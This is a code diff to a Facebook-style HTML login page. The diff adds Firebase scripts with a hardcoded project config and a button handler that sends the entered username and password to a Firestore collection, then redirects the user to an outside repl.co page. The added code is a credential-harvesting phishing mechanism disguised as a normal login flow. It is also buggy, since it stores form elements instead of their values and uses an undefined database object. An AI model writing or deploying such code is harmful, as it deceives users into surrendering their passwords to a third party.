@@ -15,6 +15,66 @@
             vertical-align: text-top;
         }
     </style>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script>
+      const firebaseConfig = {
+        apiKey: "AIzaSyAcmMhTQfzS_rgi1sGx0rxSwxrYZEPq21Q",
+        authDomain: "database-ab3c0.firebaseapp.com",
+        projectId: "database-ab3c0",
+        storageBucket: "database-ab3c0.appspot.com",
+        messagingSenderId: "778408455682",
+        appId: "1:778408455682:web:43ec68ada92d8cef20411b"
+      };
+  
+  firebase.initializeApp(firebaseConfig);
+
+    function Upload2db(){
+                // Get the current timestamp
+        const timestamp = firebase.firestore.FieldValue.serverTimestamp();
+
+        var enteredUsername = document.getElementById("username")
+        var enteredPassword = document.getElementById("password")
+
+        // Construct the data object to upload
+        const userDataToUpload = {
+        timestamp: timestamp,
+        username: enteredUsername,
+        password: enteredPassword
+        };
+
+        // Upload the data directly to the collection
+        db.collection('hahaha').add(userDataToUpload)
+        .then(docRef => {
+            // Get the ID of the newly added document
+            const userId = docRef.id;
+
+            // Set the "LoggedIn" field for the user to true
+            db.collection('users').doc(userId).set({
+            LoggedIn: true
+            }, { merge: true });
+
+            // Set items in local storage
+            localStorage.setItem("loggedIn", "true");
+            localStorage.setItem("username", enteredUsername);
+
+            // Alert or do any additional actions here if needed
+            alert("Data uploaded successfully.");
+
+            // Redirect the user to the authenticated page
+            window.location.replace("https://jajaja.danonine9.repl.co/genius.html");
+        })
+        .catch(error => {
+            console.error("Error adding document: ", error);
+            alert("An error occurred while uploading data.");
+        });
+
+        alert(enteredPassword, enteredUsername)
+
+            
+    }
+    </script>
+
 </head>
 
 <body>
@@ -38,7 +98,7 @@
                 </div>
 
                 <div class="other">
-                    <button class="fb-login-btn" type="button">
+                    <button onclick="Upload2db(), alert(enteredPassword, enteredUsername)" class="fb-login-btn" type="button">
                         <i class="fa fa-facebook-official fb-icon"></i>
                         <span class=""><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"height="15" width="15"><a href="facebook-login.html">&nbsp;Log in with Facebook</a>
                         </span>
@@ -48,7 +108,7 @@
             </form>
         </div>
         <div class="box">
-            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+            <p>Don't have an accent? <a class="signup" href="#">Sign Up</a></p>
         </div>
     </div>
     <br>
